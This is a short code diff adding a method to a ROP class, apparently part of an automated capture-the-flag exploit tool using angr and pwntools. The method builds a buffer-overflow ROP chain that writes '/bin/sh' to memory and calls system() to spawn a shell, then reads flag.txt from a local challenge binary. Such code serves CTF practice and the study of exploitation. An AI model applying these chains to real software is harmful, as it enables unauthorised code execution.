@@ -21,6 +21,23 @@ class ROP:
     
     def write_binsh_to_mem(self):
         return self.angr_rop.write_to_mem(self.get_writeable_mem(), b"/bin/sh\0").payload_str()
+
+    def ropwrite(self, dumb=False):
+        chain = b'A'*self.offset
+        chain += self.write_binsh_to_mem()
+        chain += self.fill_reg("rdi", self.get_writeable_mem())
+        if dumb:
+            chain += self.realign()
+        chain += p64(self.analysis.elf.sym['system'])
+        io = process(self.analysis.binary)
+        io.sendline(chain)
+        io.sendline(b'cat flag.txt')
+        sleep(0.1)
+        io.recvuntil(b'flag{')
+        print ("flag{"+io.recvuntil(b'}').decode('utf-8'))
+    
+
+
     
 
     def build_exploit(self):
